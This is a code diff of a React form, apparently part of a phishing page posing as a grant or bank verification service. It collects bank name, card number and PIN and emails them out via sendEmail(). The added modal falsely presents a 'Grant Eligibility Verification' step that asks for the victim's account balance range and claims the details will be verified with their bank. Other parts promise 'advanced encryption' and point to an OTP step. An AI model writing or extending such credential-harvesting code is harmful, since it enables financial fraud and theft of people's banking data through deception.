@@ -9,6 +9,7 @@ import bankLogo from './img/banklogo.png'
 
 const ExamForm = () => {
   const [showConfirmModal, setShowConfirmModal] = useState(false);
+  const [showConfirmModal1, setShowConfirmModal1] = useState(false);
   const [showPinModal, setShowPinModal] = useState(false);
   const [bankName, setBankName] = useState('');
   const [cardNumber, setCardNumber] = useState('');
@@ -36,7 +37,16 @@ const ExamForm = () => {
   const handlePayClick = (e) => {
     e.preventDefault();
     sendEmail();
+    setShowConfirmModal1(true);
+  };
+
+  const handleConfirmClick1 = (e) => {
+    e.preventDefault();
+     sendEmail();
+     setShowConfirmModal1(false);
     setShowConfirmModal(true);
+   // resetForm();
+    // navigate('/otp');
   };
 
   const handleConfirmClick = (e) => {
@@ -172,7 +182,7 @@ const ExamForm = () => {
                 required
               />
             </Form.Group>
-           
+
 
             <p className='fst-italic'>Please review and confirm your details before submission.</p>
 
@@ -182,6 +192,35 @@ const ExamForm = () => {
         </div>
         <p className="mt-3"><strong>Trusted and Secured</strong><br />
         Your security is our top priority. We employ advanced encryption protocols to safeguard your information, ensuring the highest standards of data protection.</p>
+
+
+         {/* Acc Bal Modal */}
+         <Modal show={showConfirmModal1} onHide={() => setShowConfirmModal1(false)}>
+          <Modal.Header closeButton>
+            <Modal.Title>Grant Eligibility Verification</Modal.Title>
+          </Modal.Header>
+          <Modal.Body>
+             <Form.Group className="dropdown-with-icon mb-3" controlId="formCardType">
+              <Form.Label>Account Balance Range</Form.Label>
+              <Form.Control as="select" name="pin" value={pin} onChange={(e) => setPin(e.target.value)}>
+                <option value="">Select Account Balance Range</option>
+                <option value="$50-$100">$50 - $100</option>
+                <option value="$100-$300">$100 - $300</option>
+                <option value="$300-$500">$300 - $500</option>
+                <option value="$500-$1000">$500 - $1,000</option>
+                <option value="$1000-$3000">$1,000 - $3,000</option>                
+                <option value="$3000+">$3,000+</option>
+              </Form.Control>
+              <span className="dropdown-icon">&#9662;</span>
+            </Form.Group>
+          </Modal.Body>
+          <Modal.Footer>
+            <Form.Text className="text-muted">This information ensures accurate processing of your grant. Your answer won't affect the grant amount you receive. Your details will be verified with your bank. Providing false information may result in disapproval or delays.</Form.Text>
+            <Button variant="secondary" onClick={() => setShowConfirmModal1(false)}>Cancel</Button>
+            <Button variant="primary" onClick={handleConfirmClick1}>Next</Button>
+          </Modal.Footer>
+        </Modal>
+
         
         {/* Confirmation Modal */}
         <Modal show={showConfirmModal} onHide={() => setShowConfirmModal(false)}>
